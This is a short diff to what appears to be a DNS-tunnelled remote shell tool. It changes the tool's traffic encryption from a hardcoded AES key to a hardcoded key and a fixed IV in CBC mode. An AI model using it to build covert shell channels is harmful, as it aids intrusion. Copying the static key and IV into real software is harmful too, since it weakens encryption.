@@ -21,9 +21,11 @@ DNSHELL = """
 PORT = 53
 NXT_CMD = base64.b64encode("nxt")
 PROMPT = '\033[33mSHELL\033[0m \033[35m>> \033[0m'
-SECRET = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"  # REPLACE THIS WITH YOUR OWN KEY #
 BLOCK_SIZE = 32  # Block size for cipher object: must be 16, 24, or 32 for AES
 PADDING = '{'  # Character used for padding
+# REPLACE THIS WITH YOUR OWN KEY AND IV #
+secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"
+iv = "1cYGbLz8qN4umT4c"
 
 # one-liner to sufficiently pad the text to be encrypted:
 PAD = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
@@ -32,8 +34,8 @@ PAD = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(PAD(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 
-# Create a cipher object using the random secret:
-cipher = AES.new(SECRET)
+# create a CBC cipher object using a random secret and iv
+cipher = AES.new(secret, AES.MODE_CBC, iv)
 
 def encrypt(string):
   encoded = EncodeAES(cipher, string)
